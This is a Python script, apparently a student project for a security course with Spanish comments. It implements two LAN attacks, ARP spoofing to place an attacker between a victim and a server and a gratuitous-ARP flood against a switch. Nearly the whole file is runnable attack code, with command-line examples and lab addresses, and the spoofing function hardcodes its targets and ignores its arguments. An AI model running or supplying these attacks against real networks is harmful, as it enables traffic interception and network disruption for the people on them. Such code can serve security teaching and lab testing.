import time
import socket
import argparse
from scapy.all import sendp, Ether, ARP, IP, RandIP, RandMAC


def doFrameARP(destination_mac, source_mac, sender_hardware, sender_ip, target_hardware, target_ip):
    ether_type = '\x08\x06'  # arp protocolo
    HTYPE = '\x00\x01'
    PTYPE = '\x08\x00'
    HLEN = '\x06'
    PLEN = '\x04'
    operation = '\x00\x02'
    SHA = sender_hardware
    SPA = socket.inet_aton(sender_ip)
    THA = target_hardware
    TPA = socket.inet_aton(target_ip)
    return destination_mac + source_mac + ether_type + HTYPE + PTYPE + HLEN + PLEN + operation + SHA + SPA + THA + TPA


def getMac(mac):
    #Formateamos la entrada en una cadena con hexadecimales
    mac_list = str(mac).split(':')
    return '{}{}{}{}{}{}'.format(mac_list[0].decode('hex'), mac_list[1].decode('hex'), mac_list[2].decode('hex'), mac_list[3].decode('hex'), mac_list[4].decode('hex'), mac_list[5].decode('hex'))


def man_in_midle(mac_victim, ip_victim, mac_server, ip_server, mac_attacker):
    # windows AF_INET
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
                      socket.htons(0x0800))  # creacion del socket
    s.bind(("eth0", socket.htons(0x800)))
    # ARP
    ip_server = '192.168.254.130'  # ip del servidor como sender (cambiar)
    ip_victim = '192.168.254.140'  # ip de la victima (cambiar)
    mac_victim = '\x00\x0c\x29\x66\x9a\xbb'  # mac de la victima (cambiar)
    mac_attacker = '\x8a\xe8\x36\xee\xbf\xa0'  # mac del atacante (cambiar)
    to_victim = doFrameARP(mac_victim, mac_attacker,
                           mac_attacker, ip_server, mac_victim, ip_victim)
    mac_server = '\x02\x00\x4c\x4f\x4f\x50'  # mac del servidor (cambiar)
    to_server = doFrameARP(mac_server, mac_attacker,
                           mac_attacker, ip_victim, mac_server, ip_server)
    while True:
        s.send(to_victim)
        s.send(to_server)
        print('paquetes enviados')
        time.sleep(0.5)


def flood_attack():
    #Mascaras con las que generar las macs e ips aleatorias
    DEFAULT_DIP = '0.0.0.0/0'
    DEFAULT_DMAC = 'ff:ff:ff:ff:ff:ff'
    DEFAULT_SIP = '0.0.0.0/0'
    DEFAULT_SMAC = '*:*:*:*:*:*'
    while(True):
        srcMac = str(RandMAC(DEFAULT_SMAC))
        srcIp = str(RandIP(DEFAULT_SIP))
        dstMac = str(RandMAC(DEFAULT_DMAC))
        dstIp = str(RandIP(DEFAULT_DIP))
        #Construimos el paquete con los datos generados
        packet = Ether(src=srcMac, dst=dstMac) / \
            ARP(hwsrc=srcMac, psrc=srcIp, pdst=srcIp)
        #Enviamos el paquete GARP a broadcast
        print('Enviando paquete {} - {}'.format(srcMac, srcIp))
        sendp(packet)
        time.sleep(0.1)


parser = argparse.ArgumentParser(
    description="Herramienta para el proyecto de Tecnicas de seguridad")
parser.add_argument("--flood", action='store_true',
                    help='Ataque de inundacion de GARP al switch')
parser.add_argument("--mitm", action='store_true',
                    help='Ataque de hombre en el medio entre el cliente y el servidor')
parser.add_argument('--mac_victim', default='00:00:00:00:00:00')
parser.add_argument('--ip_victim', default='0.0.0.0')
parser.add_argument('--mac_server', default='00:00:00:00:00:00')
parser.add_argument('--ip_server', default='0.0.0.0')
parser.add_argument('--mac_attack', default='00:00:00:00:00:00')
args = parser.parse_args()
if(args.flood):
    #python proyecto.py --flood
    flood_attack()
elif(args.mitm):
    #python proyecto.py --mitm --mac_victim 00:0c:29:66:9a:bb --ip_victim 192.168.254.140 --mac_server 02:00:4c:4f:4f:50 --ip_server 192.168.254.130 --mac_attack 8A:e8:36:ee:bf:a0
    man_in_midle(getMac(args.mac_victim), args.ip_victim, getMac(args.mac_server), args.ip_server, getMac(args.mac_attack))
